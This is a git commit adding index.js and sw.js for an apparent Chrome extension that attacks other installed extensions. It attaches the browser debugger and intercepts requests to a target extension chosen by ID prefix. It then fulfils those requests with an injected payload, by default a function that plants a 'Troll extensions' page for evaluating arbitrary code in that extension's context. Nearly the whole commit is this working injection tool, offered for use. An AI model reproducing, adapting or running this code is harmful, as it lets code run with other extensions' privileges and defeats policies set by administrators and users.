445774089a28eafcdc50b93ee046185f38e3d330
Wave Demure <144980384+WaveDemure@users.noreply.github.com>
2023-12-14 04:47:46 -0600

    Add files via upload

---
+++ index.js
@@ -0,0 +1,65 @@
+let extensionPrefix = document.querySelectorAll("input")[0].value;
+let payload = document.querySelectorAll("textarea")[0].value;
+let filePath = document.querySelectorAll("input")[1].value;
+let arbitraryFileContent = document.querySelectorAll("textarea")[1];
+let status = document.querySelector("#status");
+let [cancel, start] = document.querySelectorAll("button");  
+function sections() {
+    return document.querySelectorAll('body>div');
+}
+function changeStatusMessage(message) {
+    status.textContent = ([message] || [""]).join();
+}
+function checkIfValid() {
+    return new Promise((resolve, reject) => {
+        resolve(Boolean(document.querySelector("input").value.length > 0));
+    });
+}
+start.addEventListener("click", async function () {
+    let valid = await checkIfValid();
+    if (!valid) return;
+    payload = document.querySelector("textarea").value;
+    extensionPrefix = document.querySelector("input").value;
+    let msg = await chrome.runtime.sendMessage({ type: "start-inspect", prefix: extensionPrefix, payload: payload === '' ? undefined : payload });
+    if (!msg) return changeStatusMessage("failed!");
+    return changeStatusMessage(msg.status);
+});
+
+cancel.addEventListener("click", async function () {
+    let msg = await chrome.runtime.sendMessage({ type: "cancel-inspect" });
+    if (!msg) return changeStatusMessage("failed!");
+    return changeStatusMessage("canceled");
+});
+sections().forEach(function (element) {
+    element.style.display = 'none';
+});
+sections()[0].style.display = 'block';
+var currentIndex = 0;
+function switchToNextSlide(offset) {
+    sections()[currentIndex].style.display = 'none';
+    currentIndex = currentIndex + offset;
+    if (currentIndex >= sections().length) {
+        currentIndex = 0;
+    }
+    if (currentIndex < 0) {
+        currentIndex = sections().length - 1;
+    }
+    var newIndex = currentIndex;
+
+    sections()[newIndex].style.display = 'block';
+    newIndex = currentIndex;
+
+}
+
+document.onkeydown = async function (ev) {
+    if (ev.repeat) return;
+    console.log()
+    if (!([document.body, document].includes(ev.target))) {
+        return false;
+    }
+    if (ev.key === 'ArrowLeft') {
+        switchToNextSlide(-1)
+    } else if (ev.key === 'ArrowRight') {
+        switchToNextSlide(1);
+    }
+}
---
+++ sw.js
@@ -0,0 +1,149 @@
+const target = { targetId: 'browser' }
+
+function injection() {
+    if (!self.isRunning) {
+        self.isRunning = true;
+        webkitRequestFileSystem(TEMPORARY, 1024 * 1024 * 300, async function (fs) {
+            function writeFile(name, data) {
+                return new Promise((resolve) => {
+                    fs.root.getFile(name, { create: true }, function (entry) {
+                        entry.createWriter(function (writer) {
+                            writer.write(new Blob([data]));
+                            writer.onwriteend = function () {
+                                resolve(entry)
+                            }
+                        });
+                    })
+                })
+            }
+            function removeFile(name) {
+                return new Promise(function (resolve) {
+                    fs.root.getFile(name, { create: true }, function (entry) {
+                        entry.remove(resolve);
+                    })
+                })
+            }
+            function filemain() {
+                function buildBlobWithScript(script) {
+                    var fullHTML = `<script src="index.js"></script>`;
+                    return new Promise((resolve, reject) => {
+                        webkitRequestFileSystem(TEMPORARY, 1024 * 1024 * 300, function (fs) {
+                            function writeFileInDirectory(dir, name, data) {
+                                return new Promise((resolve) => {
+                                    dir.getFile(name, { create: true }, function (entry) {
+                                        entry.createWriter(function (writer) {
+                                            writer.write(new Blob([data]));
+                                            writer.onwriteend = function () {
+                                                resolve(entry)
+                                            }
+                                        });
+                                    })
+                                })
+                            }
+                            function removeFileInDirectory(dir, name) {
+                                return new Promise(function (resolve) {
+                                    dir.getFile(name, { create: true }, function (entry) {
+                                        entry.remove(resolve);
+                                    })
+                                })
+                            }
+                            fs.root.getDirectory('evaluations', { create: true }, async function (entry) {
+                                await removeFileInDirectory(entry, 'index.js');
+                                await writeFileInDirectory(entry, 'index.js', script);
+                                await removeFileInDirectory(entry, 'index.html');
+                                var handle = await writeFileInDirectory(entry, 'index.html', fullHTML);
+                                resolve(handle.toURL());
+
+                            }, reject)
+                        }, reject)
+                    })
+                }
+                document.querySelector('button').onclick = async () => {
+                    var url = await buildBlobWithScript(document.querySelector('textarea').value);
+                    // unbelievable, why can't we just use open
+                    await chrome.tabs.create({ url: url })
+                };
+            }
+            await removeFile('shim.html');
+            await removeFile('shim.js');
+            var entry = await writeFile("shim.html", "<h1>Troll extensions</h1><textarea></textarea><br/><button>Evaluate</button><script src=\"shim.js\"></script>");
+            await writeFile("shim.js", `(${filemain.toString()})()`);
+            alert("Save this in your bookmarks: " + entry.toURL());
+
+        })
+    }
+}
+var onInjectionFinished;
+var extPrefixContext;
+var payload;
+async function searchForBackgroundPage() {
+    var { targetInfos: infos } = await chrome.debugger.sendCommand(target, 'Target.getTargets');
+    var result = [];
+    infos.forEach(function (info) {
+        if (info.url.startsWith("chrome-extension://" + extPrefixContext) && info.type.includes('background')) {
+            console.log(info);
+            result.push(info);
+        }
+    })
+    return result;
+}
+function isManifestV3Extension({ url, type: requestType }) {
+    return new Promise((resolve, reject) => {
+        if (!url.startsWith("chrome-extension://") || requestType.indexOf("service")) return resolve(false); // New service workers can't be created on MV2 and services workers are created on mv3 by default.
+        resolve(true);
+    });
+};
+async function onNetEvent(_, _, event) {
+     // That is not how you make mv3 targetable just go with the mv2 flow you  need to wait for and identity the mv3 service worker target id which shouldn't be done on netEvent.
+    
+
+    if (!event.request.url.startsWith("chrome-extension://" + extPrefixContext)) {
+        await chrome.debugger.sendCommand(target, "Fetch.continueRequest", {
+            requestId: event.requestId
+        });
+        return;
+    };
+
+    await chrome.debugger.sendCommand(target, "Fetch.fulfillRequest", {
+        requestId: event.requestId,
+        responseCode: 200,
+        body: btoa(`(${payload.toString()})()`)
+    })
+}
+
+async function start() {
+    await chrome.debugger.attach(target, '1.3');
+    // let { targetInfos } = await chrome.debugger.sendCommand(target, 'Target.getTargets');
+    if (extPrefixContext && extPrefixContext !== '') {
+        // var {url: pageURL, browserContextId} = await searchForBackgroundPage();
+        // await chrome.debugger.sendCommand(target, 'Target.createTarget', {url: pageURL, browserContextId});
+    }
+    chrome.debugger.onEvent.addListener(onNetEvent)
+    await chrome.debugger.sendCommand(target, 'Fetch.enable');
+    onInjectionFinished({ status: `success visit chrome-extension://${extPrefixContext}/_generated_background_page.html to commence further with the code execution process.` });
+
+}
+
+async function stop() {
+    chrome.debugger.onEvent.addListener(async function (_, _, event) {
+        await chrome.debugger.sendCommand(target, "Fetch.continueRequest", {
+            requestId: event.requestId,
+        });
+    });
+    await chrome.debugger.detach(target);
+}
+
+chrome.runtime.onMessage.addListener(async function (msg, sender, respondWith) {
+    const { prefix } = msg;
+
+    if (msg.type === "start-inspect") {
+        extPrefixContext = msg.prefix;
+        payload = msg.payload ? 'function () {' + msg.payload + '}' : injection;
+        onInjectionFinished = respondWith;
+        await start();
+    }
+    if (msg.type === "cancel-inspect") {
+        await stop();
+        respondWith({ status: 'success' });
+    }
+});
